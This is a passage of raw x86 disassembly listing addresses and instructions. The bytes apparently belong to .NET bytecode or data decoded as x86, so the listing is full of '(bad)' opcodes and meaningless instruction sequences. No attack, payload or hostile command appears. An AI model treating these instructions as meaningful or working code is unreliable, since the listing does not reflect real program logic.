  402682:	or     dl,BYTE PTR [ecx]
  402684:	pop    es
  402685:	outs   dx,DWORD PTR ds:[esi]
  402686:	dec    eax
  402687:	add    BYTE PTR [eax],al
  402689:	or     dh,BYTE PTR [ebx+0x4c]
  40268c:	add    BYTE PTR [eax],al
  40268e:	or     dl,BYTE PTR [ecx]
  402690:	push   es
  402691:	jae    0x4026de
  402693:	add    BYTE PTR [eax],al
  402695:	or     dh,BYTE PTR [edx+0x20]
  402698:	add    al,BYTE PTR [eax]
  40269a:	jo     0x40270f
  40269c:	dec    esp
  40269d:	add    BYTE PTR [eax],al
  40269f:	or     dl,BYTE PTR [edi]
  4026a1:	lea    ecx,[eax+eax*1]
  4026a4:	add    BYTE PTR [ecx],al
  4026a6:	adc    ecx,DWORD PTR [edx]
  4026a8:	adc    DWORD PTR [edx],ecx
  4026aa:	push   ss
  4026ab:	adc    DWORD PTR [edi+ebp*2],eax
  4026ae:	inc    esp
  4026af:	add    BYTE PTR [eax],al
  4026b1:	or     dh,BYTE PTR [ebx+0x4d]
  4026b4:	add    BYTE PTR [eax],al
  4026b6:	or     ah,BYTE PTR [edx+0x4e730a11]
  4026bc:	add    BYTE PTR [eax],al
  4026be:	or     dh,BYTE PTR [edx+0x44]
  4026c1:	add    al,BYTE PTR [eax]
  4026c3:	jo     0x402738
  4026c5:	dec    esp
  4026c6:	add    BYTE PTR [eax],al
  4026c8:	or     dh,BYTE PTR [ebx+0x4f]
  4026cb:	add    BYTE PTR [eax],al
  4026cd:	or     dh,BYTE PTR [ebx+0x50]
  4026d0:	add    BYTE PTR [eax],al
  4026d2:	or     ch,BYTE PTR [edi+0x4a]
  4026d5:	add    BYTE PTR [eax],al
  4026d7:	or     ah,BYTE PTR [esi]
  4026d9:	pop    ss
  4026da:	or     eax,0x58170911
  4026df:	adc    ecx,DWORD PTR [ecx]
  4026e1:	adc    DWORD PTR [ecx],ecx
  4026e3:	adc    DWORD PTR [eax],ecx
  4026e5:	mov    gs,WORD PTR [ecx+0x3f]
  4026e8:	icebp  
  4026e9:	(bad)  
  4026ea:	(bad)  
  4026eb:	inc    DWORD PTR [esi]
  4026ed:	outs   dx,DWORD PTR ds:[esi]
  4026ee:	cmp    eax,DWORD PTR [eax]
  4026f0:	add    BYTE PTR [edx],cl
  4026f2:	pop    es
  4026f3:	outs   dx,DWORD PTR ds:[esi]
  4026f4:	cmp    al,0x0
  4026f6:	add    BYTE PTR [edx],cl
  4026f8:	or     DWORD PTR es:[edx],eax
  4026fb:	push   es
  4026fc:	add    al,0x8
  4026fe:	sub    BYTE PTR [eax],cl
  402700:	add    BYTE PTR [eax],al
  402702:	push   es
  402703:	pusha  
  402704:	or     eax,0x60d2c09
  402709:	outs   dx,DWORD PTR ds:[esi]
  40270a:	cmp    eax,DWORD PTR [eax]
  40270c:	add    BYTE PTR [edx],cl
  40270e:	or     BYTE PTR [edi+0x3c],ch
  402711:	add    BYTE PTR [eax],al
  402713:	or     ah,BYTE PTR [esi]
  402715:	add    ebp,DWORD PTR [edi+0x51]
  402718:	add    BYTE PTR [eax],al
  40271a:	or     al,BYTE PTR [esi]
  40271c:	outs   dx,DWORD PTR ds:[esi]
  40271d:	push   edx
  40271e:	add    BYTE PTR [eax],al
  402720:	or     ah,BYTE PTR [esi]
  402722:	sub    al,BYTE PTR [eax]
  402724:	adc    esi,DWORD PTR [eax]
  402726:	pop    es
  402727:	add    cl,ah
  402729:	add    BYTE PTR [eax],al
  40272b:	add    BYTE PTR [esi],al
  40272d:	add    BYTE PTR [eax],al
  40272f:	adc    DWORD PTR [edi+ebp*2],eax
  402732:	push   ebx
  402733:	add    BYTE PTR [eax],al
  402735:	or     bh,BYTE PTR [ecx]
  402737:	aam    0x0
  402739:	add    BYTE PTR [eax],al
  40273b:	add    al,0x6f
  40273d:	push   ebx
  40273e:	add    BYTE PTR [eax],al
  402740:	or     ch,BYTE PTR [edi+0x45]
  402743:	add    BYTE PTR [eax],al
  402745:	or     dl,al
  402747:	dec    edi
  402748:	add    BYTE PTR [eax],al
  40274a:	add    DWORD PTR [eax],ebp
  40274c:	xor    eax,0x280a0000
  402751:	push   esp
  402752:	add    BYTE PTR [eax],al
  402754:	or     bh,BYTE PTR [ecx]
  402756:	mov    ch,0x0
  402758:	add    BYTE PTR [eax],al
  40275a:	add    ebp,DWORD PTR [edi+0x3b]
  40275d:	add    BYTE PTR [eax],al
  40275f:	or     al,BYTE PTR [edx]
  402761:	jb     0x4027b3
  402763:	add    al,BYTE PTR [eax]
  402765:	jo     0x40276b
  402767:	outs   dx,DWORD PTR ds:[esi]
  402768:	push   ebx
  402769:	add    BYTE PTR [eax],al
  40276b:	or     ch,BYTE PTR [edi+0x45]
  40276e:	add    BYTE PTR [eax],al
  402770:	or     al,BYTE PTR [ebx]
  402772:	outs   dx,DWORD PTR ds:[esi]
  402773:	dec    eax
  402774:	add    BYTE PTR [eax],al
  402776:	or     ch,BYTE PTR [eax]
  402778:	adc    BYTE PTR [eax],al
  40277a:	add    BYTE PTR [esi],al
  40277c:	outs   dx,DWORD PTR ds:[esi]
  40277d:	cmp    al,0x0
  40277f:	add    BYTE PTR [edx],cl
  402781:	add    ebp,DWORD PTR es:[edi+0x3b]
  402785:	add    BYTE PTR [eax],al
  402787:	or     al,BYTE PTR [edx]
  402789:	jb     0x4027db
  40278b:	add    al,BYTE PTR [eax]
  40278d:	jo     0x402793
  40278f:	outs   dx,DWORD PTR ds:[esi]
  402790:	push   ebx
  402791:	add    BYTE PTR [eax],al
  402793:	or     ch,BYTE PTR [edi+0x45]
  402796:	add    BYTE PTR [eax],al
  402798:	or     al,BYTE PTR [ebx]
  40279a:	outs   dx,DWORD PTR ds:[esi]
  40279b:	dec    eax
  40279c:	add    BYTE PTR [eax],al
  40279e:	or     ch,BYTE PTR [eax]
  4027a0:	adc    DWORD PTR [eax],eax
  4027a2:	add    BYTE PTR [esi],al
  4027a4:	outs   dx,DWORD PTR ds:[esi]
  4027a5:	cmp    al,0x0
  4027a7:	add    BYTE PTR [edx],cl
  4027a9:	es add eax,0x496f
  4027af:	or     dh,BYTE PTR [ebx+0x4b]
  4027b2:	add    BYTE PTR [eax],al
  4027b4:	or     dh,BYTE PTR [edx+0x50]
  4027b7:	add    al,BYTE PTR [eax]
  4027b9:	jo     0x40282e
  4027bb:	dec    esp
  4027bc:	add    BYTE PTR [eax],al
  4027be:	or     al,BYTE PTR [edi+ebp*2]
  4027c1:	push   ebx
  4027c2:	add    BYTE PTR [eax],al
  4027c4:	or     ch,BYTE PTR [edi+0x45]
  4027c7:	add    BYTE PTR [eax],al
  4027c9:	or     dh,BYTE PTR [ebx+0x4b]
  4027cc:	add    BYTE PTR [eax],al
  4027ce:	or     dh,BYTE PTR [edx+0x20]
  4027d1:	add    al,BYTE PTR [eax]
  4027d3:	jo     0x402848
  4027d5:	dec    esp
  4027d6:	add    BYTE PTR [eax],al
  4027d8:	or     dl,BYTE PTR [edi]
  4027da:	lea    ecx,[eax+eax*1]
  4027dd:	add    BYTE PTR [ecx],al
  4027df:	or     al,BYTE PTR [esi]
  4027e1:	push   ss
  4027e2:	jb     0x40284c
  4027e4:	add    al,BYTE PTR [eax]
  4027e6:	jo     0x40285b
  4027e8:	dec    ebp
  4027e9:	add    BYTE PTR [eax],al
  4027eb:	or     ah,BYTE PTR [edx+0x4e7306]
  4027f1:	add    BYTE PTR [edx],cl
  4027f3:	jb     0x402839
  4027f5:	add    al,BYTE PTR [eax]
  4027f7:	jo     0x40286c
  4027f9:	dec    esp
  4027fa:	add    BYTE PTR [eax],al
  4027fc:	or     dh,BYTE PTR [ebx+0x4f]
  4027ff:	add    BYTE PTR [eax],al
  402801:	or     dh,BYTE PTR [ebx+0x50]
  402804:	add    BYTE PTR [eax],al
  402806:	or     ch,BYTE PTR [edi+0x4a]
  402809:	add    BYTE PTR [eax],al
  40280b:	or     ah,BYTE PTR [esi]
  40280d:	pop    ss
  40280e:	sub    dl,BYTE PTR [esi]
  402810:	sub    al,BYTE PTR [eax]
  402812:	add    BYTE PTR [eax],al
  402814:	adc    esi,DWORD PTR [eax]
  402816:	add    eax,DWORD PTR [eax]
  402818:	add    BYTE PTR ds:[eax],al
  40281b:	add    BYTE PTR [eax],cl
  40281d:	add    BYTE PTR [eax],al
  40281f:	adc    DWORD PTR [ebx+0x55],esi
  402822:	add    BYTE PTR [eax],al
  402824:	or     cl,BYTE PTR [edx]
  402826:	push   es
  402827:	jb     0x4027ad
  402829:	add    al,BYTE PTR [eax]
  40282b:	jo     0x40289c
  40282d:	add    BYTE PTR ds:[eax],al
  402830:	or     al,BYTE PTR [esi]
  402832:	and    BYTE PTR [eax+esi*1],al
  402835:	add    BYTE PTR [eax],al
  402837:	outs   dx,DWORD PTR ds:[esi]
  402838:	cmp    al,BYTE PTR [eax]
  40283a:	add    BYTE PTR [edx],cl
  40283c:	push   es
  40283d:	outs   dx,DWORD PTR ds:[esi]
  40283e:	push   esi
  40283f:	add    BYTE PTR [eax],al
  402841:	or     dl,al
  402843:	push   ecx
  402844:	add    BYTE PTR [eax],al
  402846:	add    DWORD PTR [eax],ebp
  402848:	xor    eax,0x720a0000
  40284d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40284e:	add    al,BYTE PTR [eax]
  402850:	jo     0x4028c5
  402852:	push   edi
  402853:	add    BYTE PTR [eax],al
  402855:	or     ch,BYTE PTR [edi+0x58]
  402858:	add    BYTE PTR [eax],al
  40285a:	or     ah,BYTE PTR [esi]
  40285c:	push   es
  40285d:	sub    al,BYTE PTR [eax]
  40285f:	add    BYTE PTR [ebx],dl
  402861:	xor    BYTE PTR [ebx],al
  402863:	add    BYTE PTR [esi],bh
  402865:	add    BYTE PTR [eax],al
  402867:	add    BYTE PTR [eax],cl
  402869:	add    BYTE PTR [eax],al
  40286b:	adc    DWORD PTR [ebx+0x55],esi
  40286e:	add    BYTE PTR [eax],al
  402870:	or     cl,BYTE PTR [edx]
  402872:	push   es
  402873:	jb     0x40281f
  402875:	add    al,BYTE PTR [eax]
  402877:	jo     0x4028e8
  402879:	add    BYTE PTR ds:[eax],al
  40287c:	or     al,BYTE PTR [esi]
  40287e:	and    BYTE PTR [eax+esi*1],al
  402881:	add    BYTE PTR [eax],al
  402883:	outs   dx,DWORD PTR ds:[esi]
  402884:	cmp    al,BYTE PTR [eax]
  402886:	add    BYTE PTR [edx],cl
  402888:	push   es
  402889:	outs   dx,DWORD PTR ds:[esi]
  40288a:	push   esi
  40288b:	add    BYTE PTR [eax],al
  40288d:	or     dl,al
  40288f:	push   ecx
  402890:	add    BYTE PTR [eax],al
  402892:	add    DWORD PTR [eax],ebp
  402894:	xor    eax,0x720a0000
  402899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40289a:	add    al,BYTE PTR [eax]
  40289c:	jo     0x402911
  40289e:	push   edi
  40289f:	add    BYTE PTR [eax],al
  4028a1:	or     ch,BYTE PTR [edi+0x58]
  4028a4:	add    BYTE PTR [eax],al
  4028a6:	or     ah,BYTE PTR [esi]
  4028a8:	push   es
  4028a9:	sub    al,BYTE PTR [eax]
  4028ab:	add    BYTE PTR [ebx],dl
  4028ad:	xor    BYTE PTR [ecx],cl
  4028af:	add    BYTE PTR [ecx+0x1],bl
  4028b2:	add    BYTE PTR [eax],al
  4028b4:	or     DWORD PTR [eax],eax
  4028b6:	add    BYTE PTR [ecx],dl
  4028b8:	add    al,0x6f
  4028ba:	dec    ecx
  4028bb:	add    BYTE PTR [eax],al
  4028bd:	or     dh,BYTE PTR [ebx+0x59]
  4028c0:	add    BYTE PTR [eax],al
  4028c2:	or     al,BYTE PTR ds:0x4c73
  4028c8:	or     cl,BYTE PTR [esi]
  4028ca:	add    eax,0x5073
  4028cf:	or     ch,BYTE PTR [edi+0x4a]
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	or     ah,BYTE PTR [esi]
  4028d6:	jae    0x402932
  4028d8:	add    BYTE PTR [eax],al
  4028da:	or     cl,BYTE PTR [edx]
  4028dc:	push   es
  4028dd:	add    eax,0x3e6f
  4028e2:	or     al,BYTE PTR [esi]
  4028e4:	and    BYTE PTR [eax+eiz*2],al
  4028e7:	add    BYTE PTR [eax],al
  4028e9:	outs   dx,DWORD PTR ds:[esi]
  4028ea:	cmp    al,BYTE PTR [eax]
  4028ec:	add    BYTE PTR [edx],cl
  4028ee:	push   es
  4028ef:	push   cs
  4028f0:	add    al,0x73
  4028f2:	pop    ebx
  4028f3:	add    BYTE PTR [eax],al
  4028f5:	or     ch,BYTE PTR [edi+0x5c]
  4028f8:	add    BYTE PTR [eax],al
  4028fa:	or     al,BYTE PTR [esi]
  4028fc:	outs   dx,DWORD PTR ds:[esi]
  4028fd:	pop    ebp
  4028fe:	add    BYTE PTR [eax],al
  402900:	or     dl,al
  402902:	push   esi
  402903:	add    BYTE PTR [eax],al
  402905:	add    DWORD PTR [eax],ebp
  402907:	xor    eax,0x6f0a0000
  40290c:	push   ds
  40290d:	add    BYTE PTR [eax],al
  40290f:	or     dh,BYTE PTR [ebx+0x5e]
  402912:	add    BYTE PTR [eax],al
  402914:	or     dl,BYTE PTR [edi]
  402916:	lea    edx,[edi+0x0]
  402919:	add    BYTE PTR [ecx],al
  40291b:	or     eax,DWORD PTR [edi]
  40291d:	push   ss
  40291e:	push   ss
  40291f:	mov    WORD PTR [eax+0x0],ds
  402922:	add    BYTE PTR [ecx],al
  402924:	jae    0x402973
  402926:	add    BYTE PTR [eax],al
  402928:	or     dh,BYTE PTR [ebx+0x5f]
  40292b:	add    BYTE PTR [eax],al
  40292d:	or     ah,BYTE PTR [edx+0x607307]
  402933:	add    BYTE PTR [edx],cl
  402935:	outs   dx,DWORD PTR ds:[esi]
  402936:	popa   
  402937:	add    BYTE PTR [eax],al
  402939:	or     ah,BYTE PTR [esi]
  40293b:	push   es
  40293c:	outs   dx,DWORD PTR ds:[esi]
  40293d:	pop    ebp
  40293e:	add    BYTE PTR [eax],al
  402940:	or     dl,al
  402942:	cmp    eax,0x28010000
  402947:	xor    eax,0x6f0a0000
  40294c:	push   ds
  40294d:	add    BYTE PTR [eax],al
  40294f:	or     dh,BYTE PTR [ebx+0x5e]
  402952:	add    BYTE PTR [eax],al
  402954:	or     dl,BYTE PTR [edi]
  402956:	lea    edx,[edi+0x0]
  402959:	add    BYTE PTR [ecx],al
  40295b:	or     al,0x8
  40295d:	push   ss
  40295e:	rcr    BYTE PTR [edx+0x0],1
  402961:	add    BYTE PTR [ecx],al
  402963:	sub    BYTE PTR ds:0x6f0a0000,dh
  402969:	push   ds
  40296a:	add    BYTE PTR [eax],al
  40296c:	or     dh,BYTE PTR [ebx+0x62]
  40296f:	add    BYTE PTR [eax],al
  402971:	or     dh,BYTE PTR [edx-0x36]
  402974:	add    al,BYTE PTR [eax]
  402976:	jo     0x4029eb
  402978:	dec    esp
  402979:	add    BYTE PTR [eax],al
  40297b:	or     dh,BYTE PTR [ebx+0x5f]
  40297e:	add    BYTE PTR [eax],al
  402980:	or     ah,BYTE PTR [edx+0x607308]
  402986:	add    BYTE PTR [edx],cl
  402988:	outs   dx,DWORD PTR ds:[esi]
  402989:	popa   
  40298a:	add    BYTE PTR [eax],al
  40298c:	or     ah,BYTE PTR [esi]
  40298e:	push   es
  40298f:	outs   dx,DWORD PTR ds:[esi]
  402990:	arpl   WORD PTR [eax],ax
  402992:	add    BYTE PTR [edx],cl
  402994:	jae    0x4029ef
  402996:	add    BYTE PTR [eax],al
  402998:	or     al,BYTE PTR ds:0x4c73
  40299e:	or     dh,BYTE PTR [ebx+0x64]
  4029a1:	add    BYTE PTR [eax],al
  4029a3:	or     ch,BYTE PTR [edi+0x4a]
  4029a6:	add    BYTE PTR [eax],al
  4029a8:	or     ah,BYTE PTR [esi]
  4029aa:	push   es
  4029ab:	outs   dx,DWORD PTR ds:[esi]
  4029ac:	add    BYTE PTR gs:[eax],al
  4029af:	or     dl,al
  4029b1:	pop    ebp
  4029b2:	add    BYTE PTR [eax],al
  4029b4:	add    DWORD PTR [eax],ebp
  4029b6:	xor    eax,0x6f0a0000
  4029bb:	push   ds
  4029bc:	add    BYTE PTR [eax],al
  4029be:	or     dl,BYTE PTR [edi]
  4029c0:	lea    ecx,[eax+eax*1]
  4029c3:	add    BYTE PTR [ecx],al
  4029c5:	or     eax,0x31281609
  4029ca:	add    BYTE PTR [eax],al
  4029cc:	or     dh,BYTE PTR [edx-0x28]
  4029cf:	add    al,BYTE PTR [eax]
  4029d1:	jo     0x4029eb
  4029d3:	lea    eax,[ecx]
  4029d5:	add    BYTE PTR [eax],al
  4029d7:	add    DWORD PTR [ebx],edx
  4029d9:	add    al,0x11
  4029db:	add    al,0x16
  4029dd:	add    eax,0x170411a2
  4029e2:	push   cs
  4029e3:	push   es
  4029e4:	mov    ds:0x32280411,al
  4029e9:	add    BYTE PTR [eax],al
  4029eb:	or     dh,BYTE PTR [ebx+0x4d]
  4029ee:	add    BYTE PTR [eax],al
  4029f0:	or     ah,BYTE PTR [edx+0x667309]
  4029f6:	add    BYTE PTR [edx],cl
  4029f8:	jae    0x402a61
  4029fa:	add    BYTE PTR [eax],al
  4029fc:	or     ch,BYTE PTR [edi+0x4a]
  4029ff:	add    BYTE PTR [eax],al
  402a01:	or     ah,BYTE PTR [esi]
  402a03:	add    ebp,DWORD PTR [edi+0x3b]
  402a06:	add    BYTE PTR [eax],al
  402a08:	or     al,BYTE PTR [esi]
  402a0a:	outs   dx,DWORD PTR ds:[esi]
  402a0b:	cmp    al,0x0
  402a0d:	add    BYTE PTR [edx],cl
  402a0f:	es sub bl,dh
  402a12:	add    al,BYTE PTR [ebx]
  402a14:	add    al,0x72
  402a16:	sbb    al,BYTE PTR [ebx]
  402a18:	add    BYTE PTR [eax-0x30],dh
  402a1b:	push   es
  402a1c:	add    BYTE PTR [eax],al
  402a1e:	add    DWORD PTR [eax],ebp
  402a20:	xor    eax,0x50a0000
  402a25:	outs   dx,DWORD PTR ds:[esi]
  402a26:	push   0x730a0000
  402a2b:	imul   eax,DWORD PTR [eax],0x75050a00
  402a31:	add    eax,0x2d010000
  402a36:	pop    es
  402a37:	jb     0x402a6f
  402a39:	add    eax,DWORD PTR [eax]
  402a3b:	jo     0x402a68
  402a3d:	add    eax,0x36e72
  402a42:	jo     0x402a6c
  402a44:	or     eax,DWORD PTR [eax]
  402a46:	add    BYTE PTR [esi],al
  402a48:	sub    al,BYTE PTR [eax]
  402a4a:	add    BYTE PTR [eax],al
  402a4c:	add    esi,DWORD PTR [eax]
  402a4e:	pop    es
  402a4f:	add    BYTE PTR [esi+0x0],al
  402a52:	add    BYTE PTR [eax],al
  402a54:	add    BYTE PTR [eax],al
  402a56:	add    BYTE PTR [eax],al
  402a58:	add    al,BYTE PTR [ebx]
  402a5a:	add    al,0x5
  402a5c:	jne    0x402a63
  402a5e:	add    BYTE PTR [eax],al
  402a60:	add    DWORD PTR ds:0x3a47207,ebp
  402a66:	add    BYTE PTR [eax+0x2b],dh
  402a69:	add    eax,0x3b872
  402a6e:	jo     0x402a40
  402a70:	add    BYTE PTR ss:[eax],al
  402a73:	add    DWORD PTR [eax],ebp
  402a75:	xor    eax,0x50a0000
  402a7a:	outs   dx,DWORD PTR ds:[esi]
  402a7b:	push   ds
  402a7c:	add    BYTE PTR [eax],al
  402a7e:	or     dh,BYTE PTR [ebx+0x4d]
  402a81:	add    BYTE PTR [eax],al
  402a83:	or     al,BYTE PTR ds:0x575
  402a89:	add    DWORD PTR ds:0x3367207,ebp
  402a8f:	add    BYTE PTR [eax+0x2b],dh
  402a92:	add    eax,0x36e72
  402a97:	jo     0x402ac1
  402a99:	or     eax,DWORD PTR [eax]
  402a9b:	add    BYTE PTR [esi],al
  402a9d:	sub    al,BYTE PTR [eax]
  402a9f:	add    BYTE PTR [ebx],dl
  402aa1:	xor    BYTE PTR [ebx],al
  402aa3:	add    BYTE PTR [edi],bl
  402aa5:	add    BYTE PTR [eax],al
  402aa7:	add    BYTE PTR [edx],cl
  402aa9:	add    BYTE PTR [eax],al
  402aab:	adc    DWORD PTR [edx],eax
  402aad:	add    ebp,DWORD PTR [edi+0x44]
  402ab0:	add    BYTE PTR [eax],al
  402ab2:	or     ch,BYTE PTR [eax]
  402ab4:	sbb    eax,0x73060000
  402ab9:	dec    ebx
  402aba:	add    BYTE PTR [eax],al
  402abc:	or     al,BYTE PTR [ebx+esi*2]
  402abf:	dec    esp
  402ac0:	add    BYTE PTR [eax],al
  402ac2:	or     dh,BYTE PTR [ebx+0x50]
  402ac5:	add    BYTE PTR [eax],al
  402ac7:	or     cl,BYTE PTR [edx]
  402ac9:	push   es
  402aca:	sub    al,BYTE PTR [eax]
  402acc:	adc    esi,DWORD PTR [eax]
  402ace:	add    eax,0x3500
  402ad3:	add    BYTE PTR [ebx],cl
  402ad5:	add    BYTE PTR [eax],al
  402ad7:	adc    DWORD PTR [ebx],eax
  402ad9:	or     dl,al
  402adb:	add    BYTE PTR ds:[eax],al
  402ade:	add    DWORD PTR [eax],ebp
  402ae0:	xor    eax,0x30a0000
  402ae5:	sub    BYTE PTR [edx+0x0],ch
  402ae8:	add    BYTE PTR [edx],cl
  402aea:	mov    gs,WORD PTR [ecx+0x16]
  402aed:	xor    DWORD PTR [eax+ebp*1],ebx
  402af0:	xor    DWORD PTR [eax],eax
  402af2:	add    BYTE PTR [edx],cl
  402af4:	jb     0x402ac4
  402af6:	add    eax,DWORD PTR [eax]
  402af8:	jo     0x402b11
  402afa:	lea    eax,[ecx]
  402afc:	add    BYTE PTR [eax],al
  402afe:	add    DWORD PTR [ebx],ecx
  402b00:	pop    es
  402b01:	push   ss
  402b02:	add    esp,DWORD PTR [edx+0x322807]
  402b08:	add    BYTE PTR [edx],cl
  402b0a:	or     al,BYTE PTR [esi]
  402b0c:	sub    al,BYTE PTR [eax]
  402b0e:	add    BYTE PTR [eax],al
  402b10:	adc    esi,DWORD PTR [eax]
  402b12:	push   es
  402b13:	add    BYTE PTR [ecx+0xc000000],al
  402b19:	add    BYTE PTR [eax],al
  402b1b:	adc    DWORD PTR [ebx+0x6b],esi
  402b1e:	add    BYTE PTR [eax],al
  402b20:	or     cl,BYTE PTR [edx]
  402b22:	push   es
  402b23:	sar    BYTE PTR [edi],1
  402b25:	add    BYTE PTR [eax],al
  402b27:	add    DWORD PTR [eax],ebp
  402b29:	xor    eax,0x6f0a0000
  402b2e:	push   ds
  402b2f:	add    BYTE PTR [eax],al
  402b31:	or     dh,BYTE PTR [ebx+0x5e]
  402b34:	add    BYTE PTR [eax],al
  402b36:	or     ch,BYTE PTR [edi+0x6c]
  402b39:	add    BYTE PTR [eax],al
  402b3b:	or     al,BYTE PTR [esi]
  402b3d:	add    al,BYTE PTR [ebx]
  402b3f:	sub    BYTE PTR [edx],dl
  402b41:	add    BYTE PTR [eax],al
  402b43:	push   es
  402b44:	outs   dx,DWORD PTR ds:[esi]
  402b45:	add    BYTE PTR ds:[eax],al
  402b48:	or     al,BYTE PTR [esi]
  402b4a:	and    BYTE PTR [ebx],al
  402b4c:	pusha  
  402b4d:	add    BYTE PTR [eax],al
  402b4f:	outs   dx,DWORD PTR ds:[esi]
  402b50:	cmp    al,BYTE PTR [eax]
  402b52:	add    BYTE PTR [edx],cl
  402b54:	push   es
  402b55:	sar    BYTE PTR [edi],1
  402b57:	add    BYTE PTR [eax],al
  402b59:	add    DWORD PTR [eax],ebp
  402b5b:	xor    eax,0x6f0a0000
  402b60:	push   ds
  402b61:	add    BYTE PTR [eax],al
  402b63:	or     dh,BYTE PTR [ebx+0x62]
  402b66:	add    BYTE PTR [eax],al
  402b68:	or     dh,BYTE PTR [edx-0x18]
  402b6b:	add    eax,DWORD PTR [eax]
  402b6d:	jo     0x402b88
  402b6f:	lea    ecx,[eax+eax*1]
  402b72:	add    BYTE PTR [ecx],al
  402b74:	or     eax,DWORD PTR [edi]
  402b76:	push   ss
  402b77:	add    esi,DWORD PTR [ebx+0x4d]
  402b7a:	add    BYTE PTR [eax],al
  402b7c:	or     ah,BYTE PTR [edx+0x73041707]
  402b82:	imul   eax,DWORD PTR [eax],0x7a20a00
  402b88:	sbb    BYTE PTR ds:0x6d73,al
  402b8e:	or     ah,BYTE PTR [edx+0x6e7307]
  402b94:	add    BYTE PTR [edx],cl
  402b96:	outs   dx,DWORD PTR ds:[esi]
  402b97:	outs   dx,DWORD PTR ds:[esi]
  402b98:	add    BYTE PTR [eax],al
  402b9a:	or     al,BYTE PTR [esi]
  402b9c:	sub    al,BYTE PTR [eax]
  402b9e:	add    BYTE PTR [eax],al
  402ba0:	adc    esi,DWORD PTR [eax]
  402ba2:	or     DWORD PTR [eax],eax
  402ba4:	cld    
  402ba5:	add    BYTE PTR [eax],al
  402ba7:	add    BYTE PTR ds:0x73110000,cl
  402bad:	pop    edx
  402bae:	add    BYTE PTR [eax],al
  402bb0:	or     cl,BYTE PTR [edx]
  402bb2:	push   es
  402bb3:	add    al,0x73
  402bb5:	pop    ebx
  402bb6:	add    BYTE PTR [eax],al
  402bb8:	or     ch,BYTE PTR [edi+0x5c]
  402bbb:	add    BYTE PTR [eax],al
  402bbd:	or     al,BYTE PTR [esi]
  402bbf:	add    ebp,DWORD PTR [edi+0x3e]
  402bc2:	add    BYTE PTR [eax],al
  402bc4:	or     al,BYTE PTR [esi]
  402bc6:	and    BYTE PTR [edx],al
  402bc8:	pusha  
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	outs   dx,DWORD PTR ds:[esi]
  402bcc:	cmp    al,BYTE PTR [eax]
  402bce:	add    BYTE PTR [edx],cl
  402bd0:	push   es
  402bd1:	outs   dx,DWORD PTR ds:[esi]
  402bd2:	pop    ebp
  402bd3:	add    BYTE PTR [eax],al
  402bd5:	or     dl,al
  402bd7:	inc    ecx
  402bd8:	add    BYTE PTR [eax],al
  402bda:	add    DWORD PTR [eax],ebp
  402bdc:	xor    eax,0x6f0a0000
  402be1:	push   ds
  402be2:	add    BYTE PTR [eax],al
  402be4:	or     dh,BYTE PTR [ebx+0x5e]
  402be7:	add    BYTE PTR [eax],al
  402be9:	or     dl,BYTE PTR [edi]
  402beb:	lea    edx,[edi+0x0]
  402bee:	add    BYTE PTR [ecx],al
  402bf0:	or     eax,DWORD PTR [edi]
  402bf2:	push   ss
  402bf3:	shl    BYTE PTR [edx+0x0],1
  402bf6:	add    BYTE PTR [ecx],al
  402bf8:	sub    BYTE PTR ds:0x6f0a0000,dh
  402bfe:	push   ds
  402bff:	add    BYTE PTR [eax],al
  402c01:	or     dh,BYTE PTR [ebx+0x62]
  402c04:	add    BYTE PTR [eax],al
  402c06:	or     dh,BYTE PTR [edx-0x6]
  402c09:	add    eax,DWORD PTR [eax]
  402c0b:	jo     0x402c80
  402c0d:	dec    esp
  402c0e:	add    BYTE PTR [eax],al
  402c10:	or     dh,BYTE PTR [ebx+0x5f]
  402c13:	add    BYTE PTR [eax],al
  402c15:	or     ah,BYTE PTR [edx+0x607307]
  402c1b:	add    BYTE PTR [edx],cl
  402c1d:	outs   dx,DWORD PTR ds:[esi]
  402c1e:	popa   
  402c1f:	add    BYTE PTR [eax],al
  402c21:	or     ah,BYTE PTR [esi]
  402c23:	push   es
  402c24:	outs   dx,DWORD PTR ds:[esi]
  402c25:	add    BYTE PTR gs:[eax],al
  402c28:	or     dh,BYTE PTR [ebx+0x4b]
  402c2b:	add    BYTE PTR [eax],al
  402c2d:	or     dh,BYTE PTR [edx+0xc]
  402c30:	add    al,0x0
  402c32:	jo     0x402c4c
  402c34:	lea    ecx,[eax+eax*1]
  402c37:	add    BYTE PTR [ecx],al
  402c39:	or     al,0x8
  402c3b:	push   ss
  402c3c:	add    eax,0x6273
  402c41:	or     al,BYTE PTR [edx]
  402c43:	add    ebp,DWORD PTR [eax]
  402c45:	adc    al,BYTE PTR [eax]
  402c47:	add    BYTE PTR [esi],al
  402c49:	jae    0x402cbb
  402c4b:	add    BYTE PTR [eax],al
  402c4d:	or     ah,BYTE PTR [edx+0x71731708]
  402c53:	add    BYTE PTR [eax],al
  402c55:	or     ah,BYTE PTR [edx+0x6e7308]
  402c5b:	add    BYTE PTR [edx],cl
  402c5d:	outs   dx,DWORD PTR ds:[esi]
  402c5e:	jb     0x402c60
  402c60:	add    BYTE PTR [edx],cl
  402c62:	es push es
  402c64:	outs   dx,DWORD PTR ds:[esi]
  402c65:	arpl   WORD PTR [eax],ax
  402c67:	add    BYTE PTR [edx],cl
  402c69:	add    al,0x73
  402c6b:	dec    ebx
  402c6c:	add    BYTE PTR [eax],al
  402c6e:	or     dh,BYTE PTR [edx+0x1e]
  402c71:	add    al,0x0
  402c73:	jo     0x402c8c
  402c75:	lea    ecx,[eax+eax*1]
  402c78:	add    BYTE PTR [ecx],al
  402c7a:	or     eax,0x73051609
  402c7f:	bound  eax,QWORD PTR [eax]
  402c81:	add    BYTE PTR [edx],cl
  402c83:	add    al,BYTE PTR [ebx]
  402c85:	sub    BYTE PTR [edx],dl
  402c87:	add    BYTE PTR [eax],al
  402c89:	push   es
  402c8a:	jae    0x402cfc
  402c8c:	add    BYTE PTR [eax],al
  402c8e:	or     ah,BYTE PTR [edx+0x6e7309]
  402c94:	add    BYTE PTR [edx],cl
  402c96:	jae    0x402ce7
  402c98:	add    BYTE PTR [eax],al
  402c9a:	or     dh,BYTE PTR [ebx+0x64]
  402c9d:	add    BYTE PTR [eax],al
  402c9f:	or     ch,BYTE PTR [edi+0x4a]
  402ca2:	add    BYTE PTR [eax],al
  402ca4:	or     ah,BYTE PTR [esi]
  402ca6:	push   es
  402ca7:	sub    dl,BYTE PTR [ebx]
  402ca9:	xor    BYTE PTR ds:0x1c00,al
  402caf:	add    BYTE PTR [esi],cl
